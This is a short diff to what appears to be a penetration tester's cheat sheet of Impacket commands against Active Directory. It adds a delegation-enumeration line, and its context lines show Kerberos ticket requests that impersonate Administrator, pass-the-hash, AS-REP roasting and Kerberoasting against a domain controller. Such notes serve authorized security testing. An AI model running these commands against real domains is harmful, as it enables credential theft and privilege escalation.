@@ -510,6 +510,7 @@ impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" 
 impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
 impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
+impacket-findDelegation -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
